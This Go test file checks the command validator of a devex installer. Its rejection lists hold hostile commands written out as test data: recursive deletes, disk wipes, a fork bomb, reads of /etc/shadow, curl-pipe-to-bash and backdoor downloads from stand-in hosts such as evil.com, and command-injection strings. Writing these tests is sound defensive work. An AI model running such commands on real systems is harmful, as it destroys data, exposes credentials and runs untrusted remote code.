package tui

import (
	"context"
	"testing"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/jameswlane/devex/pkg/types"
	"github.com/stretchr/testify/assert"
)

func TestValidateCommand_AllowedCommands(t *testing.T) {
	installer := createTestInstaller(t)

	allowedCommands := []string{
		"apt update",
		"apt-get install vim",
		"dpkg -i package.deb",
		"curl -fsSL https://example.com",
		"wget https://example.com/file.tar.gz",
		"git clone https://github.com/user/repo.git",
		"docker run hello-world",
		"npm install",
		"pip install requests",
		"pip3 install --user package",
		"go build ./cmd/main.go",
		"cargo build --release",
		"flatpak install org.example.App",
		"snap install code",
		"dnf install vim",
		"yum update",
		"pacman -S vim",
		"zypper install git",
		"brew install node",
		"mise install node@20",
		"mkdir -p /opt/app",
		"cp file.txt /tmp/",
		"mv old.txt new.txt",
		"chmod +x script.sh",
		"chown user:group file.txt",
		"ln -s /usr/bin/node /usr/local/bin/node",
		"tar -xzf archive.tar.gz",
		"unzip file.zip",
		"gunzip file.gz",
		"echo 'Hello World'",
		"cat /etc/os-release",
		"which node",
		"whereis python",
		"id",
		"whoami",
	}

	for _, cmd := range allowedCommands {
		t.Run(cmd, func(t *testing.T) {
			err := installer.executor.ValidateCommand(cmd)
			assert.NoError(t, err, "Command should be allowed: %s", cmd)
		})
	}
}

func TestValidateCommand_SudoCommands(t *testing.T) {
	installer := createTestInstaller(t)

	validSudoCommands := []string{
		"sudo apt update",
		"sudo apt-get install vim",
		"sudo dpkg -i package.deb",
		"sudo mkdir -p /opt/app",
		"sudo chmod +x /usr/local/bin/script",
		"sudo chown root:root /etc/config",
	}

	for _, cmd := range validSudoCommands {
		t.Run(cmd, func(t *testing.T) {
			err := installer.executor.ValidateCommand(cmd)
			assert.NoError(t, err, "Sudo command should be allowed: %s", cmd)
		})
	}
}

func TestValidateCommand_DisallowedCommands(t *testing.T) {
	installer := createTestInstaller(t)

	disallowedCommands := []string{
		"rm -rf /",
		"sh -c 'malicious code'",
		"bash -c 'evil script'",
		"python -c 'import os; os.system(\"rm -rf /\")'",
		"perl -e 'malicious code'",
		"ruby -e 'dangerous code'",
		"nc -l 1234",
		"telnet malicious.com",
		"ssh user@malicious.com",
		"sudo malicious_command",
		"unknown_command arg1 arg2",
	}

	for _, cmd := range disallowedCommands {
		t.Run(cmd, func(t *testing.T) {
			err := installer.executor.ValidateCommand(cmd)
			assert.Error(t, err, "Command should be rejected: %s", cmd)
		})
	}
}

func TestValidateCommand_CommandInjectionAttempts(t *testing.T) {
	installer := createTestInstaller(t)

	injectionAttempts := []string{
		// Command separators
		"apt update; rm -rf /",
		"apt update & malicious_command",
		"apt update | malicious_pipe",

		// Logical operators
		"apt update && rm -rf /",
		"apt update || malicious_fallback",

		// Command substitution
		"echo `rm -rf /`",
		"echo $(malicious_command)",
		"echo ${malicious_var}",

		// Directory traversal
		"cat ../../../etc/passwd",
		"cp file ../../etc/malicious",

		// Sensitive file access
		"cat /etc/passwd",
		"cat /etc/shadow",
		"grep user /etc/passwd",

		// Dangerous operations
		"rm -rf /home",
		"rm -rf /var",
		"rm -rf /usr",
		"dd if=/dev/zero of=/dev/sda",
		"dd if=/dev/urandom of=/dev/sda",

		// Fork bombs
		":(){ :|:& };:",

		// Writing to system directories
		"echo malicious > /etc/hosts",
		"echo evil > /dev/sda1", // Changed to a dangerous device
		"cat malicious > /etc/passwd",

		// Complex injection attempts
		"apt update; curl http://evil.com/script | bash",
		"npm install; wget http://malicious.com/backdoor.sh && chmod +x backdoor.sh && ./backdoor.sh",
		"pip install requests && python -c 'import subprocess; subprocess.call([\"rm\", \"-rf\", \"/\"])'",
	}

	for _, cmd := range injectionAttempts {
		t.Run(cmd, func(t *testing.T) {
			err := installer.executor.ValidateCommand(cmd)
			assert.Error(t, err, "Injection attempt should be blocked: %s", cmd)
		})
	}
}

func TestValidateCommand_EdgeCases(t *testing.T) {
	installer := createTestInstaller(t)

	testCases := []struct {
		name        string
		command     string
		shouldError bool
	}{
		{
			name:        "empty command",
			command:     "",
			shouldError: true,
		},
		{
			name:        "whitespace only",
			command:     "   \t\n  ",
			shouldError: true,
		},
		{
			name:        "command with excessive whitespace",
			command:     "  apt   update  ",
			shouldError: false,
		},
		{
			name:        "command with tabs",
			command:     "apt\tupdate",
			shouldError: false,
		},
		{
			name:        "sudo with no actual command",
			command:     "sudo",
			shouldError: true,
		},
		{
			name:        "sudo with whitespace only",
			command:     "sudo   ",
			shouldError: true,
		},
		{
			name:        "command with valid pipes for package managers",
			command:     "curl -fsSL https://example.com/script.sh",
			shouldError: false,
		},
		{
			name:        "very long command",
			command:     "apt install " + generateLongPackageList(),
			shouldError: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			err := installer.executor.ValidateCommand(tc.command)
			if tc.shouldError {
				assert.Error(t, err)
			} else {
				assert.NoError(t, err)
			}
		})
	}
}

func TestValidateCommand_CaseSensitivity(t *testing.T) {
	installer := createTestInstaller(t)

	testCases := []struct {
		name        string
		command     string
		shouldError bool
	}{
		{"lowercase apt", "apt update", false},
		{"uppercase APT", "APT update", true}, // Commands are case-sensitive
		{"mixed case Apt", "Apt update", true},
		{"lowercase sudo", "sudo apt update", false},
		{"uppercase SUDO", "SUDO apt update", true},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			err := installer.executor.ValidateCommand(tc.command)
			if tc.shouldError {
				assert.Error(t, err)
			} else {
				assert.NoError(t, err)
			}
		})
	}
}

func TestValidateCommand_SpecialCharacters(t *testing.T) {
	installer := createTestInstaller(t)

	testCases := []struct {
		name        string
		command     string
		shouldError bool
	}{
		{"command with equals", "npm install --save=true package", false},
		{"command with dashes", "apt-get install --yes vim", false},
		{"command with dots", "pip install package.name", false},
		{"command with underscores", "npm install my_package", false},
		{"command with slashes in paths", "mkdir -p /opt/my-app/bin", false},
		{"command with colons in URLs", "curl https://example.com:8080/file", false},
		{"dangerous semicolon", "apt update;", true},
		{"dangerous ampersand", "apt update &", true},
		{"dangerous pipe", "apt update |", true},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			err := installer.executor.ValidateCommand(tc.command)
			if tc.shouldError {
				assert.Error(t, err)
			} else {
				assert.NoError(t, err)
			}
		})
	}
}

// Helper functions

func createTestInstaller(t *testing.T) *StreamingInstaller {
	t.Helper()

	// Create a minimal tea program for testing
	program := tea.NewProgram(nil)

	// Create mock repository
	mockRepo := &struct{ types.Repository }{} // Empty mock for validation tests

	// Create context
	ctx := context.Background()

	return NewStreamingInstaller(program, mockRepo, ctx)
}

func generateLongPackageList() string {
	packages := make([]string, 100)
	for i := 0; i < 100; i++ {
		packages[i] = "package" + string(rune('a'+i%26))
	}
	result := ""
	for _, pkg := range packages {
		result += pkg + " "
	}
	return result
}

// Benchmark tests for performance validation

func BenchmarkValidateCommand_SimpleCommand(b *testing.B) {
	// Create test components for benchmark
	program := tea.NewProgram(nil)
	mockRepo := &struct{ types.Repository }{}
	ctx := context.Background()
	installer := NewStreamingInstaller(program, mockRepo, ctx)
	command := "apt update"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = installer.executor.ValidateCommand(command)
	}
}

func BenchmarkValidateCommand_ComplexCommand(b *testing.B) {
	// Create test components for benchmark
	program := tea.NewProgram(nil)
	mockRepo := &struct{ types.Repository }{}
	ctx := context.Background()
	installer := NewStreamingInstaller(program, mockRepo, ctx)
	command := "sudo apt-get install --yes --no-install-recommends vim git curl wget nodejs npm python3 python3-pip golang-go"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = installer.executor.ValidateCommand(command)
	}
}

func BenchmarkValidateCommand_InjectionAttempt(b *testing.B) {
	// Create test components for benchmark
	program := tea.NewProgram(nil)
	mockRepo := &struct{ types.Repository }{}
	ctx := context.Background()
	installer := NewStreamingInstaller(program, mockRepo, ctx)
	command := "apt update && curl http://evil.com/script | bash && rm -rf /"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = installer.executor.ValidateCommand(command)
	}
}
